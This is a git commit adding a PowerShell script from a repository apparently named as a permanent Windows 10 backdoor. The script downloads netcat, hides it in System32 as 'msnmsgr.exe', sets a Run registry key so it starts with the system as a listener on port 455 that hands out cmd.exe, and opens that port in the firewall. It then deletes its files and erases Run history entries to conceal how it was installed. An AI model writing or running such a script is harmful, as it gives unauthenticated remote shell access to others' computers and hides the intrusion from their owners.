c38c73da39417c973cd264262d90efa6d7ec4940
alariordas <80034759+alariordas@users.noreply.github.com>
2023-09-26 11:19:30 +0200

    Update ncinstallerdebug.ps1

--- ncinstallerdebug.ps1
+++ ncinstallerdebug.ps1
@@ -1,1 +1,88 @@
+# 1/7: Downloading ZIP file
+Write-Host "1/10: Downloading ZIP file..."
+$zipFilePath = "C:\Windows\Temp\netcat-win32-1.11.zip"
+$destinationPath = "C:\Windows\Temp\netcat-1.11"
+if (-Not ([string]::IsNullOrEmpty($zipFilePath))) {
+    Invoke-WebRequest -Uri "https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip" -OutFile $zipFilePath -UseBasicParsing
+}
+if (Test-Path $zipFilePath) {
+    Write-Host "ZIP file downloaded successfully."
+} else {
+    Write-Host "Failed to download ZIP file."
+    exit
+}
 
+# 2/7: Extracting ZIP file
+Write-Host "2/10: Extracting ZIP file..."
+Expand-Archive -Path $zipFilePath -DestinationPath $destinationPath
+if (Test-Path $destinationPath) {
+    Write-Host "ZIP file extracted successfully."
+} else {
+    Write-Host "Failed to extract ZIP file."
+    exit
+}
+
+# 3/7: Moving and Renaming
+Write-Host "3/10: Moving and Renaming..."
+$ncFilePathNested = "C:\Windows\Temp\netcat-1.11\netcat-1.11\nc.exe"
+$ncFilePathTopLevel = "C:\Windows\Temp\netcat-1.11\nc.exe"
+$system32Path = "C:\Windows\System32"
+
+if (Test-Path $ncFilePathNested) {
+    $ncFilePath = $ncFilePathNested
+} elseif (Test-Path $ncFilePathTopLevel) {
+    $ncFilePath = $ncFilePathTopLevel
+} else {
+    Write-Host "nc.exe not found in the expected extraction paths."
+    exit
+}
+
+Move-Item -Path $ncFilePath -Destination "$system32Path\nc.exe"
+if (Test-Path "$system32Path\nc.exe") {
+    Remove-Item -Path "C:\Windows\System32\msnmsgr.exe" -Force
+    Rename-Item -Path "$system32Path\nc.exe" -NewName "msnmsgr.exe"
+    Write-Host "Moved and renamed successfully."
+} else {
+    Write-Host "Failed to move nc.exe to System32."
+    exit
+}
+
+
+# 4/7: Setting up System Startup
+Write-Host "4/10: Setting up System Startup..."
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v nc /d "C:\Windows\System32\msnmsgr.exe -Ldp 455 -e cmd.exe" /t REG_SZ /f
+
+# 5/10: Adding Firewall Rule
+Write-Host "5/10: Adding Firewall Rule..."
+netsh advfirewall firewall add rule name="Service Firewall" dir=in action=allow protocol=TCP localport=455 enable=yes
+
+# 6/7: Cleanup ZIP and Folder
+Write-Host "6/10: Cleanup ZIP and Folder..."
+$ncPath = "C:\Windows\Temp\netcat-1.11"
+Remove-Item -Path $ncPath -Recurse -Force
+Remove-Item -Path $zipFilePath -Force
+
+# 7/7: Removing Specific History Entries
+Write-Host "7/10: Removing Specific History Entries..."
+$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+$runMRUEntries = Get-ItemProperty -Path $registryPath
+$stringsToDelete = @(
+    "https://raw.githubusercontent.com/alariordas/PermanentReverseShell-Win10Backdoor/main/ncinstaller.ps1",
+    "Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force",
+    "ms-settings:windowsdefender"
+)
+foreach ($entryName in $runMRUEntries.PSObject.Properties.Name) {
+    $entryValue = $runMRUEntries.$entryName
+    foreach ($stringToDelete in $stringsToDelete) {
+        if ($entryValue -like "*$stringToDelete*") {
+            Remove-ItemProperty -Path $registryPath -Name $entryName
+            Write-Host "Removed entry containing: $stringToDelete"
+        }
+    }
+}
+
+# Completion
+Write-Host "All steps completed."
+
+Write-Host -NoNewLine 'Press any key to continue...';
+$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
